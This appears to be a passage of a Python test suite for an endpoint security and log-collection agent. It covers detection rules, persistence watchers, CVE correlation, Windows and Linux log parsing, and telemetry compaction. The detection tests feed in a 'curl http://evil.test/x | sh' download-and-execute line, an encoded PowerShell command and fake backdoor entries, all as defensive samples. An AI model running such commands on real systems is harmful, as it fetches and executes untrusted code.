        forwarded = mocked.call_args.args[0]
        self.assertEqual(forwarded["category"], "remediation")
        self.assertEqual(forwarded["limit"], 20)

        with patch("controllers.fetch_logs", return_value=payload) as mocked:
            r = client.get(
                "/api/logs?date=2026-08-27&startHour=14&endHour=15"
                "&category=linux&subcategory=linux_syslog"
            )
        self.assertEqual(r.status_code, 200)
        forwarded = mocked.call_args.args[0]
        self.assertEqual(forwarded["date"], "2026-08-27")
        self.assertEqual(forwarded["startHour"], "14")
        self.assertEqual(forwarded["endHour"], "15")
        self.assertEqual(forwarded["category"], "linux")
        self.assertEqual(forwarded["subcategory"], "linux_syslog")

        with patch(
            "controllers.fetch_logs",
            side_effect=LogsQueryError(503, "RobinLogs no configurado"),
        ):
            r = client.get("/api/logs")
        self.assertEqual(r.status_code, 503)


class TestPhase3Security(unittest.TestCase):
    def test_fim_hash_and_diff(self):
        from colsoft_tools.endpoint_security import fim_diff, fim_scan

        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp.write(b"alpha")
            path = tmp.name
        try:
            scan = fim_scan([path], include_process=False)
            self.assertEqual(scan["status"], "OK")
            rec = scan["files"][0]
            self.assertEqual(rec["path"], path)
            self.assertEqual(len(rec.get("sha256") or ""), 64)
            prev = {path: {"sha256": "00", "exists": True, "user": rec.get("user")}}
            curr = {path: {"sha256": rec["sha256"], "exists": True, "user": rec.get("user")}}
            diff = fim_diff(prev, curr)
            self.assertEqual(diff[0]["change"], "modified")
            self.assertEqual(diff[0]["path"], path)
        finally:
            os.unlink(path)

    def test_persistence_scan_shape(self):
        from colsoft_tools.endpoint_security import persistence_scan

        out = persistence_scan()
        self.assertIn(out["status"], ("OK", "UNSUPPORTED"))
        if out["status"] == "OK":
            self.assertIn("items", out)
            self.assertIsInstance(out["count"], int)

    def test_scheduled_task_next_run_is_not_persistence_change(self):
        from colsoft_tools.endpoint_security import (
            _parse_schtasks_csv_line,
            persistence_fingerprint,
        )
        from colsoft_tools.sec_monitors import PersistenceWatcher

        a = _parse_schtasks_csv_line(
            r'"\Microsoft\Windows\Windows Error Reporting\QueueReporting","26/08/2026 7:55:47 p.m.","Listo"'
        )
        b = _parse_schtasks_csv_line(
            r'"\Microsoft\Windows\Windows Error Reporting\QueueReporting","26/08/2026 7:57:27 p.m.","Listo"'
        )
        self.assertEqual(a["name"], b["name"])
        self.assertNotEqual(a["next_run"], b["next_run"])

        def _scan(next_run: str, extra: str = "") -> dict:
            name = r"\Microsoft\Windows\Windows Error Reporting\QueueReporting"
            items = [
                {
                    "kind": "scheduled_task",
                    "name": name,
                    "next_run": next_run,
                    "status": "Listo",
                    "sha256": "stable-hash",
                }
            ]
            if extra:
                items.append(
                    {
                        "kind": "scheduled_task",
                        "name": extra,
                        "next_run": next_run,
                        "status": "Listo",
                        "sha256": "other-hash",
                    }
                )
            return {"items": items}

        watcher = PersistenceWatcher()
        self.assertEqual(watcher.tick(_scan("26/08/2026 7:55:47")), [])
        self.assertEqual(watcher.tick(_scan("26/08/2026 7:57:27")), [])
        created = watcher.tick(_scan("26/08/2026 8:00:00", extra=r"\Evil\Backdoor"))
        self.assertEqual(len(created), 1)
        self.assertEqual(created[0]["change"], "created")
        fps = persistence_fingerprint(_scan("t1"))
        self.assertIn(
            r"scheduled_task:\Microsoft\Windows\Windows Error Reporting\QueueReporting",
            fps,
        )

    def test_win_service_hash_includes_image_path(self):
        from colsoft_tools.endpoint_security import _sha256_text, persistence_fingerprint

        name = "FooSvc"
        a = persistence_fingerprint(
            {
                "items": [
                    {
                        "kind": "service",
                        "name": name,
                        "image_path": r"C:\a.exe",
                        "sha256": _sha256_text(f"{name}|c:\\a.exe"),
                    }
                ]
            }
        )
        b = persistence_fingerprint(
            {
                "items": [
                    {
                        "kind": "service",
                        "name": name,
                        "image_path": r"C:\evil.exe",
                        "sha256": _sha256_text(f"{name}|c:\\evil.exe"),
                    }
                ]
            }
        )
        self.assertNotEqual(a[f"service:{name}"]["sha256"], b[f"service:{name}"]["sha256"])

    def test_detection_rules_mitre(self):
        from colsoft_tools.endpoint_security import match_detection_rules
        from colsoft_tools.obs_monitors import is_control_plane_event
        from colsoft_tools.sec_monitors import ActiveResponse, DetectionEngine
        from colsoft_tools.security import CommandPolicy

        ps = match_detection_rules(
            {
                "pid": 10,
                "name": "powershell.exe",
                "cmdline": "powershell.exe -EncodedCommand ABCDEFGHIJKLMNOP",
            }
        )
        self.assertTrue(any(h["rule_id"] == "SEC-001" for h in ps))
        self.assertEqual(ps[0]["mitre_technique"], "T1059.001")

        sh = match_detection_rules(
            {"pid": 11, "name": "bash", "cmdline": "curl http://evil.test/x | sh"}
        )
        self.assertTrue(any(h["rule_id"] == "SEC-002" for h in sh))
        self.assertEqual(sh[0]["mitre_technique"], "T1059.004")

        tmp = match_detection_rules(
            {
                "pid": 12,
                "name": "a.out",
                "exe": "/tmp/a.out",
                "cmdline": "/tmp/a.out",
                "username": "nobody",
            }
        )
        self.assertTrue(any(h["rule_id"] == "SEC-003" for h in tmp))

        engine = DetectionEngine(cooldown_seconds=0)
        events = engine.tick(
            {
                (11, 1.0): {
                    "pid": 11,
                    "name": "bash",
                    "cmdline": "curl http://evil.test/x | sh",
                    "username": "root",
                }
            }
        )
        self.assertTrue(any(e["event_type"] == "security.detection" for e in events))
        self.assertTrue(is_control_plane_event(events[0]))

        blocked = []
        ar = ActiveResponse(
            {
                "policy": {"allow_high_risk": False},
                "security": {
                    "auto_response": {
                        "enabled": True,
                        "actions": [{"rule_id": "SEC-002", "command": "kill_process"}],
                    }
                },
            },
            policy=CommandPolicy({"policy": {"allow_high_risk": False}}),
            execute=lambda *a, **k: {"status": "SHOULD_NOT_RUN"},
            sink=blocked.append,
        )
        import asyncio

        out = asyncio.run(ar.maybe_respond(events[0]))
        self.assertEqual(out["event_type"], "security.response_blocked")
        self.assertTrue(blocked)

    def test_cis_and_rootkit(self):
        from colsoft_tools.endpoint_security import cis_score, rootkit_check

        cis = cis_score()
        self.assertIn(cis["status"], ("OK", "UNSUPPORTED"))
        if cis["status"] == "OK":
            self.assertIn("score", cis)
            self.assertGreaterEqual(cis["total"], 1)
        rk = rootkit_check()
        self.assertIn(rk["status"], ("OK", "UNSUPPORTED"))
        if rk["status"] == "OK":
            self.assertIn("findings", rk)

    def test_cve_correlator_log4shell(self):
        from lib.cve_correlator import correlate_packages, version_in_range

        self.assertTrue(
            version_in_range("2.14.1", {"version_gte": "2.0", "version_lt": "2.15.0"})
        )
        self.assertFalse(
            version_in_range("2.17.0", {"version_gte": "2.0", "version_lt": "2.15.0"})
        )
        out = correlate_packages(
            [{"name": "log4j-core", "version": "2.14.1"}]
        )
        self.assertGreaterEqual(out["count"], 1)
        self.assertTrue(any(m["cve"] == "CVE-2021-44228" for m in out["matches"]))

    def test_cve_rest_correlate(self):
        os.environ["ROBIN_JWT_REQUIRED"] = "0"
        from fastapi.testclient import TestClient
        from main import app

        client = TestClient(app)
        r = client.post(
            "/api/cve/correlate",
            json={"packages": [{"name": "sudo", "version": "1.9.5p1"}]},
        )
        self.assertEqual(r.status_code, 200)
        body = r.json()
        self.assertGreaterEqual(body["count"], 1)
        cat = client.get("/api/cve/catalog")
        self.assertEqual(cat.status_code, 200)
        self.assertGreaterEqual(cat.json()["count"], 1)


class TestWindowsPhase4(unittest.TestCase):
    def test_event_log_default_max_is_fifty(self):
        import inspect

        from colsoft_tools.windows_collectors import (
            EVENT_LOG_MAX_DEFAULT,
            windows_event_log,
        )

        self.assertEqual(EVENT_LOG_MAX_DEFAULT, 50)
        self.assertEqual(
            inspect.signature(windows_event_log).parameters["max_events"].default,
            EVENT_LOG_MAX_DEFAULT,
        )

    def test_event_channels_include_classic_windows_logs(self):
        from colsoft_tools.windows_collectors import (
            EVENT_CHANNELS,
            EVENT_LOG_ALIASES,
            resolve_event_channel,
        )

        classic = (
            "System",
            "Application",
            "Security",
            "Setup",
            "ForwardedEvents",
        )
        for channel in classic:
            self.assertIn(channel, EVENT_CHANNELS)
        self.assertEqual(resolve_event_channel("setup"), "Setup")
        self.assertEqual(resolve_event_channel("forwarded"), "ForwardedEvents")
        self.assertEqual(resolve_event_channel("forwarded_events"), "ForwardedEvents")
        self.assertEqual(EVENT_LOG_ALIASES["application"], "Application")
        self.assertEqual(EVENT_LOG_ALIASES["security"], "Security")
        self.assertEqual(EVENT_LOG_ALIASES["system"], "System")


class TestLogRange(unittest.TestCase):
    def test_date_and_hour_window(self):
        from colsoft_tools.log_range import (
            expand_query_window,
            journalctl_time_args,
            to_iso_z,
            wevtutil_time_query,
            window_from_params,
        )

        day = window_from_params({"date": "2026-08-27"})
        self.assertEqual(to_iso_z(day.start), "2026-08-27T00:00:00.000Z")
        self.assertEqual(to_iso_z(day.end), "2026-08-27T23:59:59.999Z")

        hours = window_from_params(
            {"date": "2026-08-27", "startHour": "14", "endHour": "15"}
        )
        self.assertEqual(to_iso_z(hours.start), "2026-08-27T14:00:00.000Z")
        self.assertEqual(to_iso_z(hours.end), "2026-08-27T15:59:59.999Z")

        clock = window_from_params(
            {"date": "2026-08-27", "startHour": "14:00", "endHour": "15:00"}
        )
        self.assertEqual(to_iso_z(clock.start), "2026-08-27T14:00:00.000Z")
        self.assertEqual(to_iso_z(clock.end), "2026-08-27T15:00:00.000Z")

        one = window_from_params({"date": "2026-08-27", "hour": 14})
        self.assertEqual(to_iso_z(one.start), "2026-08-27T14:00:00.000Z")
        self.assertEqual(to_iso_z(one.end), "2026-08-27T14:59:59.999Z")

        q = wevtutil_time_query(hours.start, hours.end)
        self.assertIn("@SystemTime>='2026-08-27T14:00:00.000Z'", q)
        self.assertIn("@SystemTime<='2026-08-27T15:59:59.999Z'", q)

        args = journalctl_time_args(clock)
        self.assertEqual(args[0], "--since")
        self.assertIn("2026-08-27 14:00:00", args[1])
        self.assertEqual(args[2], "--until")

        expanded = expand_query_window(
            {
                "date": "2026-08-27",
                "startHour": "14",
                "endHour": "15",
                "category": "linux",
            }
        )
        self.assertNotIn("date", expanded)
        self.assertNotIn("startHour", expanded)
        self.assertEqual(expanded["startDate"], "2026-08-27T14:00:00.000Z")
        self.assertEqual(expanded["category"], "linux")

    def test_os_log_tools_honor_date_and_hour_range(self):
        import json
        from colsoft_tools.log_range import in_window, window_from_params
        from colsoft_tools.observability import get_system_log

        if platform.system() != "Linux":
            self.skipTest("journald / syslog en este host")

        day = datetime.now(timezone.utc).strftime("%Y-%m-%d")
        params = {"date": day, "startHour": "14", "endHour": "15"}
        window = window_from_params(params)
        rec = get_system_log(source="system", max_lines=40, **params)
        self.assertEqual(rec["status"], "OK")
        self.assertEqual(rec["range"]["start"], f"{day}T14:00:00.000Z")
        self.assertEqual(rec["range"]["end"], f"{day}T15:59:59.999Z")
        json.dumps(rec)
        for entry in rec.get("entries") or []:
            self.assertIsInstance(entry.get("ts"), (str, type(None)))
            if entry.get("ts"):
                self.assertTrue(in_window(entry["ts"], window), entry["ts"])

        from colsoft_tools.linux_collectors import linux_syslog

        auth = linux_syslog("auth", max_lines=20, **params)
        self.assertEqual(auth["status"], "OK")
        json.dumps(auth)
        for entry in auth.get("entries") or []:
            self.assertIsInstance(entry.get("ts"), (str, type(None)))
            if entry.get("ts"):
                self.assertTrue(in_window(entry["ts"], window), entry["ts"])


class TestWindowsPhase4Collectors(unittest.TestCase):
    def test_evtx_xml_and_logman_parse(self):
        from colsoft_tools.windows_collectors import parse_evtx_xml, parse_logman_providers

        xml = """
        <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
          <System>
            <Provider Name="Microsoft-Windows-Security-Auditing"/>
            <EventID>4625</EventID>
            <Level>2</Level>
            <TimeCreated SystemTime="2026-08-21T15:00:00.0000000Z"/>
            <Channel>Security</Channel>
            <Computer>HOST1</Computer>
            <EventRecordID>42</EventRecordID>
          </System>
          <EventData>
            <Data Name="TargetUserName">alice</Data>
          </EventData>
        </Event>
        """
        rows = parse_evtx_xml(xml)
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["event_id"], "4625")
        self.assertEqual(rows[0]["level"], "error")
        self.assertEqual(rows[0]["channel"], "Security")
        self.assertEqual(rows[0]["data"]["TargetUserName"], "alice")

        providers = parse_logman_providers(
            "Provider                                 GUID\n"
            "------------------------------------------------\n"
            "Microsoft-Windows-Kernel-Process        {22FB2CD6-1111-2222-3333-444444444444}\n"
        )
        self.assertEqual(providers[0]["name"], "Microsoft-Windows-Kernel-Process")
        self.assertTrue(providers[0]["guid"].startswith("{22FB2CD6"))

    def test_event_log_watcher_skips_powershell_4104(self):
        from colsoft_tools.win_monitors import EventLogWatcher

        bucket = {
            "Microsoft-Windows-PowerShell/Operational": [
                {
                    "record_id": "1",
                    "event_id": "4104",
                    "provider": "Microsoft-Windows-PowerShell",
                    "ts": "t1",
                    "level": "4",
                },
                {
                    "record_id": "2",
                    "event_id": "4103",
                    "provider": "Microsoft-Windows-PowerShell",
                    "ts": "t2",
                    "level": "4",
                },
            ]
        }

        def fake_log(channel, max_events=40):
            return {"entries": list(bucket.get(channel) or [])}

        with patch("colsoft_tools.win_monitors.windows_event_log", side_effect=fake_log):
            watcher = EventLogWatcher(
                ["Microsoft-Windows-PowerShell/Operational"]
            )
            self.assertEqual(watcher.tick(), [])
            bucket["Microsoft-Windows-PowerShell/Operational"].extend(
                [
                    {
                        "record_id": "3",
                        "event_id": "4104",
                        "provider": "Microsoft-Windows-PowerShell",
                        "ts": "t3",
                        "level": "4",
                    },
                    {
                        "record_id": "4",
                        "event_id": "4103",
                        "provider": "Microsoft-Windows-PowerShell",
                        "ts": "t4",
                        "level": "4",
                    },
                ]
            )
            events = watcher.tick()
        ids = [str(e.get("event_id")) for e in events]
        self.assertEqual(ids, ["4103"])

        with patch("colsoft_tools.win_monitors.windows_event_log", side_effect=fake_log):
            noisy = EventLogWatcher(
                ["Microsoft-Windows-PowerShell/Operational"],
                ignore_event_ids=[],
            )
            self.assertEqual(noisy.tick(), [])
            bucket["Microsoft-Windows-PowerShell/Operational"].append(
                {
                    "record_id": "5",
                    "event_id": "4104",
                    "provider": "Microsoft-Windows-PowerShell",
                    "ts": "t5",
                    "level": "4",
                }
            )
            more = noisy.tick()
        self.assertEqual([str(e.get("event_id")) for e in more], ["4104"])

    def test_tools_unsupported_or_allowlist(self):
        from colsoft_tools.protocol import resolve_command
        from colsoft_tools.tool_catalog import ALLOWED_TOOLS
        from colsoft_tools.windows_collectors import (
            windows_cpu_inventory,
            windows_defender,
            windows_etw,
            windows_event_log,
            windows_wmi,
        )

        self.assertEqual(resolve_command("get_windows_event_log"), "windows_event_log")
        self.assertEqual(resolve_command("query_wmi"), "windows_wmi")
        for name in (
            "windows_event_log",
            "windows_etw",
            "windows_autoruns",
            "windows_wmi",
            "windows_scheduled_tasks",
            "windows_sysmon",
            "windows_defender",
        ):
            self.assertIn(name, ALLOWED_TOOLS)

        if platform.system() != "Windows":
            self.assertEqual(windows_etw()["status"], "UNSUPPORTED")
            self.assertEqual(windows_event_log()["status"], "UNSUPPORTED")
            self.assertEqual(windows_defender()["status"], "UNSUPPORTED")
            self.assertEqual(windows_wmi()["status"], "UNSUPPORTED")
            with patch(
                "colsoft_tools.windows_collectors._is_windows", return_value=True
            ), patch("colsoft_tools.windows_collectors._ps_json") as psj:
                psj.return_value = {
                    "model": "Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz",
                    "physical_cores": 6,
                    "logical_cores": 12,
                    "max_mhz": 3200,
                    "current_mhz": 3192,
                }
                rec = windows_cpu_inventory()
            self.assertEqual(rec["physical_cores"], 6)
            self.assertEqual(rec["logical_cores"], 12)
            self.assertEqual(rec["freq"]["max_mhz"], 3200.0)
            self.assertIn("i7-8700", rec["model"])
        else:
            denied = windows_wmi("Win32_NotAllowed")
            self.assertEqual(denied["status"], "ERROR")
            self.assertIn("no permitida", denied.get("error") or "")
            rec = windows_cpu_inventory()
            self.assertTrue(rec.get("physical_cores"))
            self.assertTrue((rec.get("freq") or {}).get("max_mhz"))

    def test_control_plane_and_robinlogs_map(self):
        from colsoft_tools.obs_monitors import is_control_plane_event

        self.assertTrue(is_control_plane_event({"event_type": "windows.autorun_change"}))
        self.assertTrue(
            is_control_plane_event(
                {"event_type": "windows.eventlog", "severity": "critical"}
            )
        )
        self.assertFalse(
            is_control_plane_event(
                {"event_type": "windows.eventlog", "severity": "low"}
            )
        )
        self.assertTrue(is_control_plane_event({"event_type": "linux.unit_change"}))
        self.assertTrue(
            is_control_plane_event({"event_type": "linux.audit", "severity": "high"})
        )
        self.assertTrue(
            is_control_plane_event(
                {"event_type": "linux.netlink", "change": "iface_removed"}
            )
        )
        self.assertFalse(
            is_control_plane_event(
                {"event_type": "linux.netlink", "change": "socket_added"}
            )
        )

        captured = []

        def fake_event(*_a, **kwargs):
            captured.append(kwargs)

        with patch("lib.metrics_logger.log_agent_event", side_effect=fake_event):
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "windows.autorun_change",
                        "severity": "high",
                        "path": r"HKLM\\Software\\Run",
                    }
                },
            )
            log_event_push(
                "agt",
                {
                    "event": {
                        "event_type": "windows.eventlog",
                        "severity": "low",
                        "channel": "System",
                    }
                },
            )
        self.assertEqual(captured[0]["event_type"], "audit")
        self.assertEqual(captured[0]["subcategory"], "autorun_change")
        self.assertEqual(captured[1]["event_type"], "activity")

    def test_windows_tool_result_is_compacted_and_logged(self):
        from colsoft_tools.data_plane import compact_event_for_otlp
        from colsoft_tools.tool_catalog import WINDOWS_TOOLS, tool_category

        self.assertEqual(tool_category("windows_event_log"), "windows")
        self.assertIn("windows_wmi", WINDOWS_TOOLS)

        fat = {
            "tool": "windows_event_log",
            "status": "OK",
            "count": 40,
            "entries": [
                {
                    "ts": "2026-08-21T19:00:00Z",
                    "level": "info",
                    "provider": "Microsoft-Windows-Security-Auditing",
                    "event_id": "4624",
                    "channel": "Security",
                    "computer": "HOST1",
                    "record_id": str(i),
                    "data": {
                        "TargetUserName": "alice",
                        "PrivilegeList": ("SeTcbPrivilege\n" * 80),
                    },
                }
                for i in range(40)
            ],
        }
        compact = compact_event_for_otlp(
            {"event_type": "telemetry.tool_result", "tool": "windows_event_log", "result": fat}
        )
        entries = (compact.get("result") or {}).get("entries") or []
        self.assertLessEqual(len(entries), 12)
        self.assertTrue((compact.get("result") or {}).get("truncated"))
        self.assertIn("TargetUserName", (entries[0].get("data") or {}))
        self.assertLess(len(json.dumps(compact)), 8000)

        captured = []

        def fake_event(*_a, **kwargs):
            captured.append(kwargs)

        with patch("lib.metrics_logger.log_agent_event", side_effect=fake_event):
            log_tool_execution(
                "agt",
                "windows_event_log",
                success=True,
                result_summary="OK",
                result=compact.get("result"),
            )
        self.assertEqual(captured[0]["category"], "windows")
        self.assertEqual(captured[0]["subcategory"], "windows_event_log")
        self.assertEqual(captured[0]["data"]["result"]["status"], "OK")
        self.assertGreaterEqual(len(captured[0]["data"]["result"]["entries"]), 1)

    def test_command_result_compacted_for_websocket(self):
        from colsoft_tools.data_plane import compact_command_result

        fat = {
            "tool": "windows_event_log",
            "status": "OK",
            "count": 80,
            "entries": [
                {
                    "ts": "2026-08-21T19:00:00Z",
                    "level": "info",
                    "provider": "Security",
                    "event_id": "4624",
                    "message": "x" * 400,
                    "data": {"PrivilegeList": "SeTcbPrivilege\n" * 40},
                }
                for _ in range(80)
            ],
        }
        out = compact_command_result(fat, tool="windows_event_log")
        self.assertEqual(out.get("status"), "OK")
        self.assertTrue(out.get("truncated"))
        self.assertLessEqual(len(out.get("entries") or []), 3)
        self.assertTrue(all("data" not in (e or {}) for e in (out.get("entries") or [])))
        self.assertLessEqual(len(json.dumps(out)), 2000)
        ping = compact_command_result(
            {"tool": "ping", "status": "UP", "success": True, "host": "8.8.8.8"},
            tool="ping",
        )
        self.assertTrue(ping.get("success"))
        auth = compact_command_result(
            {
                "tool": "auth_audit",
                "status": "OK",
                "events": [{"action": "login_success"} for _ in range(80)],
            },
            tool="auth_audit",
        )
        self.assertLessEqual(len(auth.get("events") or []), 12)
        self.assertTrue(auth.get("truncated") or auth.get("events_omitted"))
        self.assertEqual(ping.get("status"), "UP")
        self.assertTrue(ping.get("success"))

    def test_forensic_snapshot_keeps_sample_under_logger_budget(self):
        from colsoft_tools.data_plane import _OTLP_PAYLOAD_MAX, compact_event_for_otlp

        fat = {
            "tool": "forensic_snapshot",
            "status": "OK",
            "processes": {
                "tool": "process_list",
                "status": "OK",
                "count": 80,
                "processes": [
                    {
                        "pid": i,
                        "name": f"proc{i}.exe",
                        "username": "SYSTEM",
                        "cmdline": ("C:\\Windows\\System32\\svchost.exe -k " + "x" * 400),
                    }
                    for i in range(80)
                ],
            },
            "network_connections": {
                "tool": "network_connections",
                "status": "OK",
                "count": 80,
                "connections": [
                    {
                        "laddr": f"10.0.0.{i % 250}:443",
                        "raddr": "203.0.113.1:443",
                        "status": "ESTABLISHED",
                        "pid": i,
                        "process_name": f"proc{i}.exe",
                    }
                    for i in range(80)
                ],
            },
            "recent_logs": {
                "tool": "system_log",
                "status": "OK",
                "count": 80,
                "entries": [
                    {
                        "ts": "2026-08-21T19:00:00Z",
                        "level": "info",
                        "provider": "Security",
                        "event_id": str(4624 + i),
                        "channel": "Security",
                        "data": {"TargetUserName": "alice", "blob": "Z" * 500},
                    }
                    for i in range(80)
                ],
            },
            "persistence": {
                "tool": "persistence_scan",
                "status": "OK",
                "count": 40,
                "items": [
                    {"kind": "runkey", "path": rf"HKLM\Run\{i}", "name": f"r{i}"}
                    for i in range(40)
                ],
            },
        }
        compact = compact_event_for_otlp(
            {
                "event_type": "telemetry.tool_result",
                "tool": "forensic_snapshot",
                "result": fat,
            }
        )
        dumped = json.dumps(compact)
        self.assertLessEqual(len(dumped), _OTLP_PAYLOAD_MAX)
        self.assertNotEqual(compact.get("error"), "payload_too_large")
        result = compact.get("result") or {}
        self.assertEqual(result.get("status"), "OK")
        self.assertTrue(result.get("truncated"))
        procs = (result.get("processes") or {}).get("processes") or []
        conns = (result.get("network_connections") or {}).get("connections") or []
        logs = (result.get("recent_logs") or {}).get("entries") or []
        self.assertGreater(len(procs) + len(conns) + len(logs), 0)
        if procs:
            self.assertLessEqual(len(str(procs[0].get("cmdline") or "")), 180)

    def test_logger_data_always_compacted_before_send(self):
        from colsoft_tools.data_plane import _OTLP_PAYLOAD_MAX, compact_logger_data

        fat_result = {
            "tool": "forensic_snapshot",
            "status": "OK",
            "processes": {
                "count": 80,
                "processes": [
                    {"pid": i, "name": f"p{i}", "cmdline": "x" * 400}
                    for i in range(80)
                ],
            },
            "network_connections": {
                "count": 80,
                "connections": [
                    {"laddr": f"10.0.0.{i}:1", "raddr": "1.1.1.1:443", "pid": i}
                    for i in range(80)
                ],
            },
        }
        tool_data = compact_logger_data(
            {
                "agent_id": "agt",
                "tool": "forensic_snapshot",
                "tool_family": "observability",
                "success": True,
                "result": fat_result,
            }
        )
        self.assertLessEqual(len(json.dumps(tool_data)), _OTLP_PAYLOAD_MAX)
        self.assertEqual(tool_data.get("agent_id"), "agt")

        keep_data = compact_logger_data(
            {
                "agent_id": "agt",
                "tool": "windows_event_log",
                "target": "channel=Security",
                "duration_ms": 12,
                "result_summary": "OK",
                "result": {"status": "OK", "entries": [{"message": "x" * 9000}]},
            }
        )
        self.assertEqual(keep_data.get("target"), "channel=Security")
        self.assertEqual(keep_data.get("duration_ms"), 12)
        self.assertNotEqual(tool_data.get("error"), "payload_too_large")
        self.assertTrue(
            (tool_data.get("result") or {}).get("truncated")
            or tool_data.get("truncated")
        )

        push_data = compact_logger_data(
            {
                "agent_id": "agt",
                "event_type": "telemetry.tool_result",
                "tool": "process_list",
                "result": fat_result["processes"],
            }
        )
        self.assertLessEqual(len(json.dumps(push_data)), _OTLP_PAYLOAD_MAX)
        self.assertLessEqual(
            len((push_data.get("result") or {}).get("processes") or []), 12
        )

        otlp_data = compact_logger_data(
            {
                "agent_id": "agt",
                "tool": "service_status",
                "otlp": True,
                "payload": {
                    "tool": "service_status",
                    "event_type": "telemetry.tool_result",
                    "result": {
                        "status": "OK",
                        "count": 200,
                        "services": [
                            {"unit": f"svc{i}", "desc": "d" * 200} for i in range(200)
                        ],
                    },
                },
            }
        )
        self.assertLessEqual(len(json.dumps(otlp_data)), _OTLP_PAYLOAD_MAX)
        services = (
            (otlp_data.get("payload") or {}).get("result") or {}
        ).get("services") or []
        self.assertLessEqual(len(services), 12)

    def test_otlp_metric_points_not_sampled_for_robinlogs(self):
        from colsoft_tools.data_plane import compact_logger_data

        names = [
            "system.cpu.utilization",
            "system.cpu.logical.count",
            "system.cpu.load_average.1m",
            "system.cpu.load_average.5m",
            "system.cpu.load_average.15m",
            "system.memory.utilization",
            "system.memory.usage",
            "system.memory.available",
            "system.memory.available.mbytes",
            "system.memory.swap.utilization",
            "system.memory.swap.usage",
            "system.filesystem.utilization",
            "system.uptime",
            "system.network.io.bytes_sent",
            "system.network.io.bytes_recv",
            "system.network.packets.sent",
            "system.disk.operations.read",
            "system.network.connections.listen",
            "system.network.connections.established",
            "health.probe.down",
        ]
        packed = compact_logger_data(
            {
                "agent_id": "agt",
                "otlp": True,
                "points": [
                    {"name": n, "value": float(i), "unit": "1"}
                    for i, n in enumerate(names)
                ],
            }
        )
        got = [p["name"] for p in packed.get("points") or []]
        self.assertEqual(got, names)
        self.assertNotIn("points_omitted", packed)

    def test_dns_lookup_answers_are_sampled_in_compact(self):
        from colsoft_tools.data_plane import compact_event_for_otlp

        compact = compact_event_for_otlp(
            {
                "event_type": "telemetry.tool_result",
                "tool": "dns_lookup",
                "result": {
                    "tool": "dns_lookup",
                    "status": "OK",
                    "answers": [{"data": f"10.0.0.{i}"} for i in range(40)],
                },
            }
        )
        answers = (compact.get("result") or {}).get("answers") or []
        self.assertLessEqual(len(answers), 12)
        self.assertGreater((compact.get("result") or {}).get("answers_omitted") or 0, 0)

    def test_wmi_flattens_cim_metadata_for_logger(self):
        from colsoft_tools.data_plane import compact_event_for_otlp
        from colsoft_tools.windows_collectors import flatten_wmi_row

        fat_row = {
            "CimClass": {
                "CimSuperClassName": "Win32_BaseService",
                "CimClassProperties": ["Name"] * 40,
            },
            "CimInstanceProperties": [
                {"Name": "Name", "Value": "Dnscache"},
                {"Name": "State", "Value": "Running"},
                {"Name": "Caption", "Value": None},
            ],
            "CimSystemProperties": {"ClassName": "Win32_Service"},
            "Caption": "DNS Client",
            "Name": "Dnscache",
            "State": "Running",
        }
        flat = flatten_wmi_row(fat_row)
        self.assertIsNotNone(flat)
        self.assertNotIn("CimClass", flat)
        self.assertEqual(flat["Name"], "Dnscache")
        self.assertEqual(flat["Caption"], "DNS Client")

        compact = compact_event_for_otlp(
            {
                "event_type": "telemetry.tool_result",
                "tool": "windows_wmi",
                "result": {
                    "tool": "windows_wmi",
                    "status": "OK",
                    "count": 20,
                    "rows": [fat_row] * 20,
                },
            }
        )
        rows = (compact.get("result") or {}).get("rows") or []
        self.assertLessEqual(len(rows), 12)
        self.assertNotIn("CimClass", rows[0])
        self.assertEqual(rows[0]["Name"], "Dnscache")
        self.assertLess(len(json.dumps(compact)), 8000)

    def test_win_monitors_noop_off_windows(self):
        from colsoft_tools.win_monitors import spawn_win_tasks

        if platform.system() == "Windows":
            self.skipTest("este caso cubre el no-op fuera de Windows")
        tasks = spawn_win_tasks(
            {"windows": {"event_log": {"enabled": True}}},
            sink=lambda e: None,
        )
        self.assertEqual(tasks, [])


class TestLinuxPhase4(unittest.TestCase):
    def test_audit_line_parse(self):
        from colsoft_tools.linux_collectors import parse_audit_line

        rec = parse_audit_line(
            'type=SYSCALL msg=audit(1710000000.120:42): pid=4521 comm="bash" '
            'exe="/usr/bin/bash" syscall=59 success=yes'
        )
        self.assertEqual(rec["type"], "SYSCALL")
        self.assertEqual(rec["pid"], "4521")
        self.assertEqual(rec["comm"], "bash")
        self.assertEqual(rec["exe"], "/usr/bin/bash")

    def test_syslog_channels_match_classic_windows_logs(self):
        from colsoft_tools.linux_collectors import (
            SYSLOG_CHANNELS,
            resolve_syslog_source,
        )

        classic = (
            "system",
            "application",
            "security",
            "setup",
            "forwarded",
        )
        self.assertEqual(SYSLOG_CHANNELS, classic)
        self.assertEqual(resolve_syslog_source("journald"), "system")
        self.assertEqual(resolve_syslog_source("app"), "application")
        self.assertEqual(resolve_syslog_source("security"), "security")
        self.assertEqual(resolve_syslog_source("setup"), "setup")
        self.assertEqual(resolve_syslog_source("forwarded_events"), "forwarded")

    def test_systemctl_timer_row_uses_timer_name(self):
        from colsoft_tools.linux_collectors import parse_systemctl_line

        timer_line = (
            "Mon 2026-08-24 10:40:00 -05 1min 35s Mon 2026-08-24 10:30:01 -05 "
            "8min ago sysstat-collect.timer sysstat-collect.service"
        )
        rec = parse_systemctl_line(timer_line, unit_suffix=".timer")
        self.assertEqual(rec["unit"], "sysstat-collect.timer")
        self.assertNotIn("active", rec)
        naive = parse_systemctl_line(timer_line)
        self.assertEqual(naive["unit"], "Mon")

        svc = parse_systemctl_line(
            "accounts-daemon.service loaded active running Accounts Service"
        )
        self.assertEqual(svc["unit"], "accounts-daemon.service")
        self.assertEqual(svc["active"], "active")
        self.assertEqual(svc["sub"], "running")

        timer_unit = parse_systemctl_line(
            "logrotate.timer loaded active waiting logrotate.timer"
        )
        self.assertEqual(timer_unit["unit"], "logrotate.timer")
        self.assertEqual(timer_unit["active"], "active")
        self.assertEqual(timer_unit["sub"], "waiting")

    def test_unit_file_line_is_not_list_units_columns(self):
        from colsoft_tools.linux_collectors import (
            _enrich_enabled,
            parse_systemctl_line,
            parse_unit_file_line,
        )

        rec = parse_unit_file_line("sshd.service enabled enabled")
        self.assertEqual(rec["unit"], "sshd.service")
        self.assertEqual(rec["state"], "enabled")
